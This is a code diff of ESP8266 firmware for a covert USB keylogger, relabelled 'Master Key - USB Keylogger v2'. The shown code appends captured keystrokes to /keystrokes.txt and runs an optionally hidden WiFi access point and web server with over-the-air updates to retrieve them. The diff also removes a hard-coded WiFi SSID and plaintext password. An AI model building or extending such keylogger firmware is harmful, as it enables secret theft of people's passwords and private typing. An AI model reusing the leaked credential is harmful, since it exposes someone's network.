@@ -28,24 +28,17 @@ extern const uint8_t data_styleCSS[] PROGMEM;
 extern const uint8_t data_functionsJS[] PROGMEM;
 extern const uint8_t data_liveHTML[] PROGMEM;
 extern const uint8_t data_infoHTML[] PROGMEM;
-extern const uint8_t data_nomalizeCSS[] PROGMEM;
-extern const uint8_t data_skeletonCSS[] PROGMEM;
 extern const uint8_t data_license[] PROGMEM;
 extern const uint8_t data_settingsHTML[] PROGMEM;
 extern const uint8_t data_viewHTML[] PROGMEM;
 extern const uint8_t data_keylogHTML[] PROGMEM;
+extern const uint8_t data_skeletonCSS[] PROGMEM;
+extern const uint8_t data_nomalizeCSS[] PROGMEM;
 
 extern String formatBytes(size_t bytes);
 
 
-/* ============= CHANGE WIFI CREDENTIALS ============= */
-const char *ssid = "Indian Brothel";
-const char *password = "diet0zones3940dean"; //min 8 chars
-/* ============= ======================= ============= */
-
-//ESP8266HTTPUpdateServer httpUpdater;
 AsyncWebServer server(80);
-//ESP8266WebServer server2 (8080);
 
 
 // Script stuff
@@ -115,7 +108,7 @@ void setup() {
   
   Serial.begin(BAUD_RATE);
 
-  Serial.println("\n\n\nUSB Keylogger v2\n\n");
+  Serial.println("\n\n\nMaster Key - USB Keylogger v2\n\n");
   
   
   EEPROM.begin(4096);
@@ -124,12 +117,6 @@ void setup() {
   settings.load();
   settings.print();
 
-  //httpUpdater.setup(&server2, "/update", "admin", "admin");
-
-  //Serial.println(WiFi.SSID());
-  //WiFi.mode(WIFI_STA);
-  //WiFi.softAP(ssid,password);
-
   WiFi.mode(WIFI_STA);
   WiFi.softAP(settings.ssid, settings.password, settings.channel, settings.hidden);
   
@@ -137,12 +124,6 @@ void setup() {
 
   f = SPIFFS.open("/keystrokes.txt", "a+");
   if(!f) Serial.println("file open failed");
-
-  /*
-  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
-    request->send(SPIFFS, "/keystrokes.txt", "text/plain");
-  });
-  */
 
   server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
     f.close();
@@ -344,22 +325,9 @@ void setup() {
     send404(request);
   });
 
-  server.on("/update", HTTP_GET, [](AsyncWebServerRequest *request) {
-    AsyncWebServerResponse *response = request->beginResponse(302, "text/plain", "");
-    response->addHeader("Location", "/info.html");
-    request->send(response);
-  });
-
   server.on("/restart", HTTP_GET, [](AsyncWebServerRequest *request) {
     shouldReboot = true;
   });
-
-  server.on("/reset", HTTP_GET, [](AsyncWebServerRequest *request) {
-    settings.reset();
-    request->send(200, "text/plain", "true");
-    sendToIndex(request);
-  });
-
 
   AsyncElegantOTA.begin(&server);
   server.begin();
